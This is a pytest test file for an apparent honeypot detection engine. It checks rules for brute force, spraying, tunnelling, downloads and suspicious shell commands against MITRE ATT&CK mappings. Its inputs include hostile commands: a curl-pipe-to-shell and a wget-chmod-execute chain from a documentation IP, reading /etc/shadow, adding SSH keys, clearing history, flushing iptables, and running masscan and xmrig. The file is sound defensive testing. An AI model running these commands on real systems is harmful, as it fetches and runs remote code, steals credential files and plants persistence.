"""One test per detection rule: fires at threshold, stays quiet below it, maps only evidenced techniques."""

import copy

import pytest

from honeytrap.detection.engine import evaluate
from honeytrap.detection.rules import RULES, rule_catalog


def fired(events, config=None, rule=None):
    alerts = evaluate(events, config)
    return [a for a in alerts if rule is None or a.rule_id == rule]


def techniques(alert):
    return {t.technique_id for t in alert.techniques}


# ----------------------------------------------------------------- authentication

def test_brute_force_threshold_and_severity(log):
    for i in range(9):
        log.login("root", f"pw{i}")
    assert not fired(log.events(), rule="HT-AUTH-001")
    log.login("root", "pw9")
    (alert,) = fired(log.events(), rule="HT-AUTH-001")
    assert alert.severity == "Medium"
    assert {"T1110", "T1110.001"} <= techniques(alert)
    assert alert.evidence["failed_logins"] == 10
    for i in range(40):
        log.login("admin", f"x{i}", seconds=0.5)
    (alert,) = fired(log.events(), rule="HT-AUTH-001")
    assert alert.severity == "High"


def test_brute_force_across_many_usernames_is_not_password_guessing(log):
    for i in range(12):
        log.login(f"user{i}", f"pw{i}")
    (alert,) = fired(log.events(), rule="HT-AUTH-001")
    assert techniques(alert) == {"T1110"}


def test_brute_force_is_per_ip(log):
    for i in range(6):
        log.login("root", f"a{i}", ip="203.0.113.1")
        log.login("root", f"b{i}", ip="203.0.113.2")
    assert not fired(log.events(), rule="HT-AUTH-001")


def test_password_spraying(log):
    for user in ["a", "b", "c", "d"]:
        log.login(user, "Summer2026")
    assert not fired(log.events(), rule="HT-AUTH-002")
    log.login("e", "Summer2026")
    (alert,) = fired(log.events(), rule="HT-AUTH-002")
    assert techniques(alert) == {"T1110.003"}
    assert "Summer2026" not in str(alert.to_dict())
    assert alert.evidence["password_masked"] == "S********6"


def test_repeated_credentials(log):
    log.login("root", "123456")
    log.login("root", "123456")
    assert not fired(log.events(), rule="HT-AUTH-003")
    log.login("root", "123456")
    (alert,) = fired(log.events(), rule="HT-AUTH-003")
    assert alert.severity == "Low"
    assert alert.evidence["repeated_pairs"][0]["attempts"] == 3


def test_credential_stuffing_requires_low_repeat_ratio(log):
    users = ["root", "admin", "oracle", "git", "test"]
    for i in range(20):
        log.login(users[i % 5], f"combo{i}")
    (alert,) = fired(log.events(), rule="HT-AUTH-004")
    (t,) = alert.techniques
    assert t.technique_id == "T1110.004" and t.confidence == "low"


def test_credential_stuffing_not_raised_for_retry_storm(log):
    users = ["root", "admin", "oracle", "git", "test"]
    for i in range(20):
        log.login(users[i % 5], f"combo{i}")
        log.login(users[i % 5], f"combo{i}")
    assert not fired(log.events(), rule="HT-AUTH-004")


def test_shared_credentials_across_ips(log):
    for i in range(4):
        log.login("admin", "admin1234", ip=f"203.0.113.{i + 10}", session=f"s{i}")
    assert not fired(log.events(), rule="HT-AUTH-005")
    log.login("admin", "admin1234", ip="203.0.113.99", session="s9")
    (alert,) = fired(log.events(), rule="HT-AUTH-005")
    assert alert.severity == "Informational"
    assert alert.src_ip is None and len(alert.related_ips) == 5
    assert alert.entity.startswith("credential:")


def test_successful_login_maps_default_account(log):
    log.login("root", "toor", ok=True)
    log.login("deploy", "deploy", ok=True, session="s2")
    alerts = {a.evidence["username"]: a for a in fired(log.events(), rule="HT-AUTH-006")}
    assert techniques(alerts["root"]) == {"T1078", "T1078.001"}
    assert techniques(alerts["deploy"]) == {"T1078"}


# ----------------------------------------------------------------- network

def test_high_frequency_connections(log):
    for i in range(19):
        log.connect(session=f"c{i}", seconds=1)
    assert not fired(log.events(), rule="HT-NET-001")
    log.connect(session="c19", seconds=1)
    (alert,) = fired(log.events(), rule="HT-NET-001")
    assert techniques(alert) == {"T1595"}


def test_multiple_sessions_escalates_with_login(log):
    for i in range(5):
        log.connect(session=f"m{i}", seconds=600)
    (alert,) = fired(log.events(), rule="HT-NET-002")
    assert alert.severity == "Low" and alert.techniques == []
    log.login("root", "x", ok=True, session="m4")
    (alert,) = fired(log.events(), rule="HT-NET-002")
    assert alert.severity == "Medium"


def test_tunnel_attempt(log):
    log.add("cowrie.direct-tcpip.request", dst_ip="198.51.100.10", dst_port=25)
    (alert,) = fired(log.events(), rule="HT-NET-003")
    assert techniques(alert) == {"T1090", "T1572"}


# ----------------------------------------------------------------- shell activity

@pytest.mark.parametrize("command,rule,severity,technique", [
    ("uname -a", "HT-CMD-001", "Low", "T1082"),
    ("echo Zm9v | base64 -d | sh", "HT-CMD-002", "Medium", "T1140"),
    ("echo key >> ~/.ssh/authorized_keys", "HT-CMD-003", "High", "T1098.004"),
    ("history -c", "HT-CMD-004", "Medium", "T1070.003"),
    ("iptables -F", "HT-CMD-004", "High", "T1686"),
    ("cat /etc/shadow", "HT-CMD-005", "Medium", "T1003.008"),
    ("masscan -p22 10.0.0.0/8", "HT-CMD-006", "High", "T1046"),
    ("./xmrig --donate-level 1", "HT-CMD-007", "High", "T1496.001"),
])
def test_command_rules(log, command, rule, severity, technique):
    log.cmd(command)
    (alert,) = fired(log.events(), rule=rule)
    assert alert.severity == severity
    assert technique in techniques(alert)
    mapping = next(t for t in alert.techniques if t.technique_id == technique)
    assert mapping.evidence == [f"$ {command}"]


def test_discovery_escalates_with_breadth(log):
    for c in ["uname -a", "whoami", "ifconfig"]:
        log.cmd(c)
    (alert,) = fired(log.events(), rule="HT-CMD-001")
    assert alert.severity == "Medium"


def test_benign_session_raises_nothing_about_commands(log):
    log.cmd("echo hello")
    log.cmd("exit")
    assert not [a for a in fired(log.events()) if a.rule_id.startswith(("HT-CMD", "HT-DL"))]


# ----------------------------------------------------------------- downloads

def test_download_attempt(log):
    log.cmd("wget http://198.51.100.7/bins/x86")
    (alert,) = fired(log.events(), rule="HT-DL-001")
    assert alert.severity == "High"
    assert alert.evidence["urls"] == ["http://198.51.100.7/bins/x86"]
    assert techniques(alert) == {"T1105"}
    assert not fired(log.events(), rule="HT-DL-002")


def test_download_event_without_command(log):
    log.add("cowrie.session.file_upload", filename="bot.bin", shasum="ee" * 32)
    (alert,) = fired(log.events(), rule="HT-DL-001")
    assert alert.evidence["outcomes"] == {"uploaded": 1}


def test_download_and_execute_chain_is_critical(log):
    log.cmd("cd /tmp; wget http://198.51.100.7/bins/x86")
    log.cmd("chmod +x x86")
    log.cmd("./x86 ssh")
    (alert,) = fired(log.events(), rule="HT-DL-002")
    assert alert.severity == "Critical"
    assert techniques(alert) == {"T1105", "T1059.004"}
    assert "x86" in alert.evidence["payload_names"]


def test_curl_pipe_shell_is_critical(log):
    log.cmd("curl -s http://198.51.100.7/i.sh | sh")
    assert fired(log.events(), rule="HT-DL-002")


def test_unrelated_execution_is_not_a_chain(log):
    log.cmd("wget http://198.51.100.7/bins/x86")
    log.cmd("./other_tool")
    assert not fired(log.events(), rule="HT-DL-002")


def test_execution_before_download_is_not_a_chain(log):
    log.cmd("./x86")
    log.cmd("wget http://198.51.100.7/x86")
    assert not fired(log.events(), rule="HT-DL-002")


# ----------------------------------------------------------------- engine properties

def test_origins_are_never_correlated(log, redactor):
    for i in range(6):
        log.login("root", f"p{i}")
    live = log.events(origin="live", redactor=redactor)
    sim = log.events(origin="simulation", redactor=redactor)
    # 6 + 6 failed logins from the same IP would cross the threshold of 10 if mixed.
    assert not fired(live + sim, rule="HT-AUTH-001")


def test_alert_ids_are_deterministic_and_window_aligned(log):
    for i in range(10):
        log.login("root", f"p{i}")
    first = fired(log.events(), rule="HT-AUTH-001")[0]
    log.login("root", "later", seconds=5)
    second = fired(log.events(), rule="HT-AUTH-001")[0]
    assert first.alert_id == second.alert_id
    assert second.evidence["failed_logins"] == 11


def test_thresholds_are_configurable(log, config):
    cfg = copy.deepcopy(config)
    cfg["brute_force"]["failed_logins"] = 3
    for i in range(3):
        log.login("root", f"p{i}")
    assert fired(log.events(), cfg, rule="HT-AUTH-001")


def test_every_alert_technique_has_evidence(fixture_lines, redactor):
    from honeytrap.ingestion.parser import parse_lines

    alerts = evaluate(list(parse_lines(fixture_lines, origin="simulation", redactor=redactor)))
    assert alerts
    for alert in alerts:
        for t in alert.techniques:
            assert t.evidence, (alert.rule_id, t.technique_id)


def test_rule_catalog_lists_every_registered_rule():
    catalog = rule_catalog()
    assert {r["rule_id"] for r in catalog} == set(RULES)
    assert len(RULES) == 18
